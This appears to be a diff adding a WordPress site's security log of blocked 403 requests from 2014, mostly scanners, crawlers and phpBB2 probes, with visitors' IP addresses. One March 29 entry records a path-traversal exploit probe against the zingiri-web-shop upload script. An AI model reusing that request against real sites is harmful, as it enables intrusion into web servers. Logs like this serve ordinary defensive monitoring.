+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 1, 2014 - 6:50 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 1, 2014 - 8:10 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 1, 2014 - 9:37 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 1, 2014 - 10:56 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 1, 2014 - 12:17 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 2, 2014 - 1:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 5, 2014 - 8:38 пп <<<<<<<<<<<
+REMOTE_ADDR: 195.184.208.5
+Host Name: 5-208-184-195-pool-vpn.drive.dn.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 5, 2014 - 8:38 пп <<<<<<<<<<<
+REMOTE_ADDR: 195.184.208.5
+Host Name: 5-208-184-195-pool-vpn.drive.dn.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 7, 2014 - 3:56 дп <<<<<<<<<<<
+REMOTE_ADDR: 107.170.71.158
+Host Name: 107.170.71.158
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 7, 2014 - 4:35 дп <<<<<<<<<<<
+REMOTE_ADDR: 107.170.75.203
+Host Name: 107.170.75.203
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 7, 2014 - 9:51 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 10, 2014 - 4:18 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.96.228
+Host Name: 162.243.96.228
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 10, 2014 - 4:32 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.96.228
+Host Name: 162.243.96.228
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 11, 2014 - 5:30 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 15, 2014 - 4:02 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 19, 2014 - 12:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 26, 2014 - 12:41 пп <<<<<<<<<<<
+REMOTE_ADDR: 64.71.131.87
+Host Name: whoisnew.hrn9.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: PECL::HTTP/1.7.6 (PHP/5.3.3)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 27, 2014 - 2:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 178.68.223.107
+Host Name: 178.68.223.107
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 27, 2014 - 2:43 дп <<<<<<<<<<<
+REMOTE_ADDR: 178.68.223.107
+Host Name: 178.68.223.107
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 29, 2014 - 10:22 пп <<<<<<<<<<<
+REMOTE_ADDR: 46.118.55.202
+Host Name: SOL-FTTB.202.55.118.46.sovam.net.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://bible-core.com/wp-content/plugins/zingiri-web-shop/fwkfor/ajax/uploadfilexd.php?fh=/../../../../../../wp-includes
+REQUEST_URI: /wp-content/plugins/zingiri-web-shop/fwkfor/ajax/uploadfilexd.php?fh=/../../../../../../wp-includes
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:22.0) Gecko/20100101 Firefox/22.0
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 31, 2014 - 7:20 дп <<<<<<<<<<<
+REMOTE_ADDR: 207.244.73.5
+Host Name: 207.244.73.5
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 31, 2014 - 11:16 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.194.85.51
+Host Name: l37-194-85-51.novotelecom.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Март 31, 2014 - 11:16 пп <<<<<<<<<<<
+REMOTE_ADDR: 37.194.85.51
+Host Name: l37-194-85-51.novotelecom.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 6, 2014 - 11:29 пп <<<<<<<<<<<
+REMOTE_ADDR: 83.234.93.254
+Host Name: 83.234.93.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 7, 2014 - 9:43 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.59.183
+Host Name: 162.243.59.183
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 7, 2014 - 10:28 пп <<<<<<<<<<<
+REMOTE_ADDR: 107.170.119.193
+Host Name: 107.170.119.193
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 12, 2014 - 5:01 пп <<<<<<<<<<<
+REMOTE_ADDR: 107.170.118.226
+Host Name: 107.170.118.226
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 12, 2014 - 5:15 пп <<<<<<<<<<<
+REMOTE_ADDR: 107.170.118.226
+Host Name: 107.170.118.226
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 13, 2014 - 3:54 пп <<<<<<<<<<<
+REMOTE_ADDR: 83.234.93.254
+Host Name: 83.234.93.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 13, 2014 - 3:54 пп <<<<<<<<<<<
+REMOTE_ADDR: 83.234.93.254
+Host Name: 83.234.93.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 15, 2014 - 11:21 дп <<<<<<<<<<<
+REMOTE_ADDR: 91.188.117.221
+Host Name: WIN-7M3KHLIZKBD
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 15, 2014 - 11:21 дп <<<<<<<<<<<
+REMOTE_ADDR: 91.188.117.221
+Host Name: WIN-7M3KHLIZKBD
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 16, 2014 - 5:03 дп <<<<<<<<<<<
+REMOTE_ADDR: 83.234.93.254
+Host Name: 83.234.93.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/3.0 (compatible; Indy Library)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 16, 2014 - 5:03 дп <<<<<<<<<<<
+REMOTE_ADDR: 83.234.93.254
+Host Name: 83.234.93.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2/index.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; GTB6; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.04506)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Апрель 17, 2014 - 2:15 пп <<<<<<<<<<<
+REMOTE_ADDR: 83.234.93.254
+Host Name: 83.234.93.254
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+[403 GET / HEAD Request: Май 9, 2014 - 5:54 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 107.170.141.217
+Host Name: 107.170.141.217
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+[403 GET / HEAD Request: Май 10, 2014 - 1:28 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 54.72.252.3
+Host Name: ec2-54-72-252-3.eu-west-1.compute.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 10, 2014 - 5:16 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 54.76.5.252
+Host Name: ec2-54-76-5-252.eu-west-1.compute.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 10, 2014 - 8:48 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 54.72.195.220
+Host Name: ec2-54-72-195-220.eu-west-1.compute.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 10, 2014 - 12:15 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 54.72.182.100
+Host Name: ec2-54-72-182-100.eu-west-1.compute.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 13, 2014 - 4:49 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 217.150.38.185
+Host Name: Gamma-gw.transtelecom.net
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+[403 GET / HEAD Request: Май 13, 2014 - 9:59 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 54.76.20.156
+Host Name: ec2-54-76-20-156.eu-west-1.compute.amazonaws.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+[403 GET / HEAD Request: Май 17, 2014 - 11:29 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 107.170.142.79
+Host Name: 107.170.142.79
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+[403 GET / HEAD Request: Май 17, 2014 - 11:43 дп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 107.170.142.79
+Host Name: 107.170.142.79
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+[403 GET / HEAD Request: Май 17, 2014 - 10:22 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 188.92.76.167
+Host Name: 188.92.76.167
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://wmaid.com/explore/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; WebMasterAid/1.0; +http://wmaid.com/explore/)
+
+[403 GET / HEAD Request: Май 18, 2014 - 2:59 пп]
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.32.49.174
